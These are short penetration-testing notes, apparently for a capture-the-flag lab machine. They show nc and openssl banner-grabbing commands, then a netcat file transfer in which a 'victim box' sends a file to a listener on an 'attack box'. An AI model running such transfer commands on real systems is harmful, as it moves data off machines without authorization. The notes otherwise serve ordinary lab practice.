
## Banner Grabbing

### SSH

nc -nv 10.129.11.198 22

### HTTP

printf 'HEAD / HTTP/1.0\r\n\r\n' | nc -nv 10.129.11.198 80

### TLS

openssl s_client -connect 10.129.11.198:443 -servername sso.management.htb
printf 'HEAD /openam/XUI/ HTTP/1.0\r\nHost: sso.management.htb\r\n\r\n' | openssl s_client -quiet -connect 10.129.11.198:443 -servername sso.management.htb

### Other Ports

nc -nv 10.129.11.198 50389
nc -nv 10.129.11.198 1689 


## File Transfers

### Attack Box

NC listener on attack box.

`nc -lvp 4445 > file.txt`

### Victim Box

Initiate the transfer on the victim box. Use -v 0 so that NC doesnt just sit there when the transfer is complete.

`cd /home/user1/`

`nc -v 0 10.10.14.120 4445 < file.txt`


